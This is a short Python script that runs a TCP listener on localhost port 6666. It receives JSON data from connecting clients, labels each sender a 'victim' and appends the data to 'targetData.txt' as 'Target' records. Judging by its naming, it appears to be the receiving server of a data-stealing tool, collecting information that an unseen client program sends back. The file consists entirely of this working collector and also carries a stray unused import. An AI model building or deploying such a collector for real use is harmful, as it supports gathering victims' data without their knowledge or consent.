from re import T
import socket
import json

ip = '127.0.0.1'
port = 6666

def saveToFile(tarData):
    with open('targetData.txt', 'a') as fp:
        fp.write(f'\n{"="*40} Target {"="*40}\n\n')
        fp.write(str(json.dumps(tarData, indent=4)))

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    address = (ip, port)
    sock.bind(address)
    sock.listen(1)
    print(f'listening on {ip}:{str(port)}')
    while True:
        conn, ipVictim = sock.accept()
        msg = 'this is the msg from the server.'
        conn.send(msg.encode())
        resp = conn.recv(1024)
        targetResp = resp.decode()
        objData = json.loads(targetResp)
        # dataPrinter(objData)
        saveToFile(objData)
        conn.close()

main()